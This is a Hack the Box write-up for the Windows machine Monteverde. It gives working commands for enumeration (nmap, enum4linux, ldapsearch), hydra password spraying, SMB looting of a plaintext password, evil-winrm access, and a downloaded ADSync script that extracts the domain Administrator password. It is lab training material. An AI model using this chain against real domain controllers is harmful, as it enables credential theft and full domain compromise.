+++
author = "Nick"
categories = ["hack the box", "CTF", "ldap", "evil-winrm", "AzureADSync", "easy", "enum4linux", "hydra", "smb", "smbclient", "medium", "windows"]
date = 2020-06-13T15:00:00Z
description = ""
draft = false
image = "__GHOST_URL__/content/images/2020/01/info.png"
slug = "hack-the-box-monteverde"
summary = "Welcome back! Today's write-up will be for the Hack the Box machine Monteverde. This is listed as a medium Windows machine."
tags = ["hack the box", "CTF", "ldap", "evil-winrm", "AzureADSync", "easy", "enum4linux", "hydra", "smb", "smbclient", "medium", "windows"]
title = "Hack the Box - Monteverde"

+++


Welcome back! Today's write-up will be for the Hack the Box machine Monteverde. This is listed as a medium Windows machine.

Let's jump in!

As always, we start with our standard `nmap` scan: `nmap -sC -sV -p- -oA allscan 10.10.10.172`

Here are our results:
```
Nmap scan report for 10.10.10.172
Host is up (0.19s latency).
Not shown: 65516 filtered ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-01-15 20:40:56Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49702/tcp open  msrpc         Microsoft Windows RPC
49778/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=1/15%Time=5E1F7660%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 10m35s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-01-15T20:43:18
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jan 15 15:35:20 2020 -- 1 IP address (1 host up) scanned in 1691.42 seconds
```

We see that we have a bunch of ports open. We see some SMB, RPC, DNS and LDAP. To further our enumeration we will use `enum4linux`. We'll also add `megabank` to our hosts file for further usage.

Command:
`enum4linux -A 10.10.10.172`

This returns a large set of results. The key things we get from this are:

* The domain.
* A user list.
* Domain group memberships.

We'll also try to null authenticate to the SMB port via `smbclient` or `smbmap` but we get no results.

Much like we did in the machine Resolute, we will make a few LDAP queries to see if there is any data stored in the user's AD variables.

Command:
`ldapsearch -x -h megabank -b 'dc=megabank,dc=local' "(&(objectClass=user))" `

We'll take these and put them into a list for use later. I created two lists, one with the domain prefix and another without. We didn't see any data in the AD fields associated with the user accounts. Now we have a few options, with a username list we can try and brute force our way in or continue to look for leaky data and services. Why not both?

First we'll try to use the account name as a password, then we'll try a password list like rockyou. For this we'll use `hydra`. 

Command:
`hydra -L users-nodm.lst -P users-nodm.lst 10.10.10.172 ldap2`

We use the `-L` to specify a username list. 
The `-P` is for a password list.
Then the IP followed by the service we want to use.

![](/images/2020/01/monte_user.gif)

We get a match! `SABatchJobs`:`SABatchJobs`. 

Well, I did not expect that. Normally I would continue with Rockyou.txt but the box is already pretty unstable connection wise, so we'll opt out of that for now and see where we can get with these service account credentials.

Since we have a set of credentials and we know that `WinRM` is running we can try to leverage `evil-winRM`. We try to login but we aren't able to. Next we'll want to try to use these authenticated credentials in order to enumerate the previously spotted `SMB` port.

Command:
`smbmap -u SABatchJobs -p SABatchjobs -H 10.10.10.172`

![](/images/2020/01/monte_smb.gif)

We get a few shares back - C$, E$, azure_uploads, NETLOGON, SYSVOL and users$.

The users$ share is read only, so we'll first start by connecting to this and seeing if there are any credentials saved by the users in thier home directories.

Command:
`smbclient -U SABatchJobs //10.10.10.172/users$`

![](/images/2020/01/image-46.png)

We start looking into each users directory. We only find one file, azure.xml, in mhope's home directory. We download the file with `get`. When we open it up, we see some credentials!

![](/images/2020/01/image-47.png)

Armed with this potential password, we'll try to authenticate as mhope.

Command:
`evil-winrm -i 10.10.10.171 -u mhope -p 4n0therD4y@n0th3r$`

![](/images/2020/01/image-48.png)

We head over to mhope's Desktop and get our User.txt flag. We start to enumerate internally now. We see that `net user mhope` shows him as part of the Azure admins.

![](/images/2020/01/image-49.png)

I then like to run [WindowsEnum.ps1](https://github.com/absolomb/WindowsEnum) on a machine to get a basic idea of my rights and what I can see from the current user. Right away we see Microsoft AADSync. Since I've spent time as a System Engineer, I knew this was the immediate path I would take.

There is a powershell script called [Azure-ADConnect](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1) that will extract the password from the ADSync database. You can also read more on it [here](https://blog.xpnsec.com/azuread-connect-for-redteam/) as well.

The first thing we do is `curl` or `wget` the script.

Command:
`wget https://raw.githubusercontent.com/Hackplayers/PsCabesha-tools/master/Privesc/Azure-ADConnect.ps1`

Next we upload the file via our Evil-WinRM session.

Command:
`upload Azure-ADConnect.ps1`

Next we import the module. Then supply the database location and name and let it rip!

Command:
`import-module ./Azure-ADConnect.ps1`
`Azure-ADConnect -server 127.0.0.1 -db ADSync`

![](/images/2020/01/monte_admin_cred.gif)

Now we have the Administrator credentials, we can try and log back in via Evil-WinRM to see if they work.

![](/images/2020/01/image-50.png)

They do work! We log in, head over to the Administrator's Desktop and snag the root.txt flag!

Hopefully everyone was able to take something away from this blog post. If so, think about sending me some respect over on HTB. Here's my [profile](https://www.hackthebox.eu/home/users/profile/95635).



